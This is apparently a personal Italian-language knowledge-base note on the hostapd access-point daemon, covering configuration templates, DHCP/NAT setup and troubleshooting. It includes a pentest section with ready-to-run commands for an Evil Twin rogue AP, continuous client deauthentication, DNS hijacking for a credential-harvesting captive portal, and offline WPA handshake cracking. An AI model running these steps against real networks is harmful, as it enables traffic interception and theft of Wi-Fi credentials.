---

Tipo: Software / Daemon Categoria: Wireless / Networking Rischio: 🟡 Medio (dipende dalla configurazione) tags:

- tool
- hostapd
- wireless
- wifi
- wpa
- networking
- access-point

---

# 📡 Hostapd — Host Access Point Daemon

> [!info] Cos'è `hostapd` è un daemon Linux che permette di trasformare una scheda di rete wireless in un **Access Point (AP)** o un server di autenticazione 802.1X. È il software alla base di router, hotspot e reti wireless enterprise su sistemi Linux/BSD. In ambito sicurezza è fondamentale per simulare AP malevoli, analizzare autenticazioni wireless e testare reti WPA/WPA2/WPA3.

---

## 🧠 Background — Come funziona un Access Point

Un Access Point gestisce due cose principali:

1. **Beacon frames** — trasmette periodicamente il nome della rete (SSID) per rendersi visibile ai client
2. **Autenticazione** — gestisce l'handshake con i client che vogliono connettersi

```
[Client] ←── beacon (SSID) ───── [AP / hostapd]
[Client] ──── probe request ───→ [AP / hostapd]
[Client] ←── probe response ──── [AP / hostapd]
[Client] ──── authentication ──→ [AP / hostapd]
[Client] ←── association ──────  [AP / hostapd]
[Client] ══════ dati cifrati ═══ [AP / hostapd]
```

---

## 📦 Installazione

```bash
# Debian / Kali / Ubuntu
sudo apt install hostapd

# Verifica installazione
hostapd -v

# Dipendenze comuni
sudo apt install dnsmasq iw wireless-tools
```

---

## ⚙️ Configurazione base

Hostapd si configura tramite un file `.conf`. Ecco i template principali:

### Access Point aperto (no password)

```ini
# /etc/hostapd/hostapd.conf

interface=wlan0          # interfaccia wireless da usare
driver=nl80211           # driver (nl80211 per la maggior parte delle schede moderne)
ssid=MiaRete             # nome della rete (SSID)
hw_mode=g                # modalità: a=5GHz, b=2.4GHz legacy, g=2.4GHz, n=dual
channel=6                # canale (1-13 per 2.4GHz, 36-165 per 5GHz)
macaddr_acl=0            # nessun filtro MAC
auth_algs=1              # algoritmo di autenticazione (1=open)
ignore_broadcast_ssid=0  # 0=SSID visibile, 1=hidden network
```

### Access Point WPA2-Personal (PSK)

```ini
interface=wlan0
driver=nl80211
ssid=MiaRete
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# WPA2
wpa=2                              # 1=WPA, 2=WPA2, 3=WPA+WPA2
wpa_passphrase=PasswordSicura123   # password rete (min 8 caratteri)
wpa_key_mgmt=WPA-PSK               # metodo key management
wpa_pairwise=TKIP                  # cifratura unicast (TKIP o CCMP)
rsn_pairwise=CCMP                  # cifratura WPA2 (CCMP = AES)
```

### Access Point WPA2-Enterprise (802.1X + RADIUS)

```ini
interface=wlan0
driver=nl80211
ssid=CorpNetwork
hw_mode=g
channel=6

wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# Server RADIUS interno (FreeRADIUS)
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=radiussecret
```

### Rete nascosta (Hidden SSID)

```ini
interface=wlan0
driver=nl80211
ssid=ReteNascosta
hw_mode=g
channel=1
ignore_broadcast_ssid=1            # nasconde l'SSID dai beacon
auth_algs=1
wpa=2
wpa_passphrase=Password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

---

## 🚀 Utilizzo

```bash
# Avvio con file di configurazione
sudo hostapd /etc/hostapd/hostapd.conf

# Avvio in background (daemon mode)
sudo hostapd -B /etc/hostapd/hostapd.conf

# Avvio con debug verboso (utile per analizzare handshake)
sudo hostapd -d /etc/hostapd/hostapd.conf

# Avvio con debug massimo
sudo hostapd -dd /etc/hostapd/hostapd.conf

# Test configurazione senza avviare
sudo hostapd -t /etc/hostapd/hostapd.conf
```

### Gestione come servizio systemd

```bash
# Specificare il file di config
echo 'DAEMON_CONF="/etc/hostapd/hostapd.conf"' | sudo tee -a /etc/default/hostapd

# Abilitare e avviare il servizio
sudo systemctl unmask hostapd
sudo systemctl enable hostapd
sudo systemctl start hostapd
sudo systemctl status hostapd
```

---

## 🌐 Setup completo — AP con DHCP e routing

Per creare un AP funzionante che assegni IP e faccia routing:

```bash
# 1. Configura l'interfaccia wireless con IP statico
sudo ip addr add 192.168.50.1/24 dev wlan0
sudo ip link set wlan0 up

# 2. Configura dnsmasq per DHCP e DNS
cat << EOF | sudo tee /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,24h
dhcp-option=3,192.168.50.1    # gateway
dhcp-option=6,8.8.8.8         # DNS
EOF

# 3. Abilita IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 4. NAT verso Internet (sostituisci eth0 con la tua interfaccia)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# 5. Avvia dnsmasq e hostapd
sudo systemctl start dnsmasq
sudo hostapd /etc/hostapd/hostapd.conf
```

---

## 💥 Uso offensivo — Evil Twin / Rogue AP

Un **Evil Twin** è un AP malevolo che imita una rete legittima per intercettare traffico o catturare credenziali. Hostapd è la base per costruirne uno.

> [!danger] Solo in ambienti autorizzati Creare un Rogue AP su reti non autorizzate è illegale. Usare solo in lab, CTF o con permesso esplicito.

```bash
# 1. Identifica la rete target (SSID, canale, BSSID)
sudo airodump-ng wlan0mon

# 2. Crea la configurazione Evil Twin
cat << EOF > /tmp/evil_twin.conf
interface=wlan0
driver=nl80211
ssid=NomeReteVittima           # stesso SSID della rete legittima
hw_mode=g
channel=6                      # stesso canale della rete legittima
auth_algs=1
wpa=2
wpa_passphrase=password        # password qualsiasi (per catturare handshake)
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# 3. Avvia l'Evil Twin
sudo hostapd /tmp/evil_twin.conf

# 4. (Opzionale) Deautentica i client dalla rete legittima
sudo aireplay-ng --deauth 0 -a <BSSID_legittimo> wlan0mon
```

### Captive Portal con Evil Twin

Combinando hostapd con un web server e dnsmasq in modalità "DNS hijack", si può creare un portale captive che cattura le credenziali WPA inserite dagli utenti:

```bash
# dnsmasq in modalità hijack — risponde con il tuo IP a qualsiasi query DNS
echo "address=/#/192.168.50.1" >> /etc/dnsmasq.conf
```

---

## 🔍 Analisi dell'handshake WPA

Con hostapd in modalità debug si possono analizzare i passaggi del **4-way handshake** WPA2:

```
[Client] ── EAPOL Message 1 ──→ [AP]   (AP invia ANonce)
[Client] ←─ EAPOL Message 2 ─── [AP]   (Client risponde con SNonce + MIC)
[Client] ── EAPOL Message 3 ──→ [AP]   (AP invia GTK cifrato)
[Client] ←─ EAPOL Message 4 ─── [AP]   (Client conferma)
```

Il **MIC (Message Integrity Code)** nel messaggio 2 è derivato dalla password WPA — catturando i messaggi 1 e 2 è possibile fare offline cracking con hashcat o aircrack-ng.

```bash
# Cattura handshake con airodump-ng
sudo airodump-ng -c 6 --bssid <BSSID> -w /tmp/capture wlan0mon

# Cracking con hashcat (modalità WPA2)
hashcat -m 22000 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt

# Cracking con aircrack-ng
aircrack-ng /tmp/capture.cap -w /usr/share/wordlists/rockyou.txt
```

---

## 📋 Parametri hostapd.conf — riferimento

|Parametro|Valori|Descrizione|
|---|---|---|
|`interface`|`wlan0`, `wlan1`|Interfaccia wireless|
|`driver`|`nl80211`, `hostap`|Driver da usare|
|`ssid`|stringa|Nome della rete|
|`hw_mode`|`a`, `b`, `g`, `n`, `ac`|Modalità wireless|
|`channel`|1-13 (2.4GHz), 36-165 (5GHz)|Canale radio|
|`ignore_broadcast_ssid`|`0`, `1`, `2`|0=visibile, 1=hidden, 2=blank SSID|
|`wpa`|`1`, `2`, `3`|Versione WPA|
|`wpa_passphrase`|stringa (8-63 char)|Password WPA-PSK|
|`wpa_key_mgmt`|`WPA-PSK`, `WPA-EAP`, `SAE`|Metodo di autenticazione|
|`rsn_pairwise`|`CCMP`, `TKIP`|Cifratura WPA2|
|`macaddr_acl`|`0`, `1`, `2`|0=nessun filtro, 1=whitelist, 2=blacklist|
|`max_num_sta`|intero|Max client simultanei|

---

## 🐛 Errori comuni e soluzioni

|Errore|Causa|Soluzione|
|---|---|---|
|`nl80211: Could not configure driver mode`|Driver non supportato|Verificare con `iw list` che la scheda supporti AP mode|
|`Interface initialization failed`|Interfaccia occupata o in monitor mode|`sudo ip link set wlan0 down && sudo iw wlan0 set type managed`|
|`Could not set channel`|Canale non supportato o regolamentazione|Cambiare canale o `iw reg set BO`|
|`ELOOP: Could not register read socket`|Permessi insufficienti|Usare `sudo`|
|Client non ricevono IP|dnsmasq non avviato|Verificare `systemctl status dnsmasq`|

```bash
# Verifica se la scheda supporta modalità AP
iw list | grep -A 10 "Supported interface modes"

# Resetta l'interfaccia wireless
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

---

## 🔗 Riferimenti

- [hostapd — documentazione ufficiale](https://w1.fi/hostapd/)
- [hostapd.conf — esempio completo](https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf)
- [HackTricks — Wifi Attacks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi)
- [[Vulnerabilità/Evil Twin|Evil Twin Attack]]
- [[Vulnerabilità/WPA Handshake Cracking|WPA Handshake Cracking]]
- [[Tool/aircrack-ng|aircrack-ng]]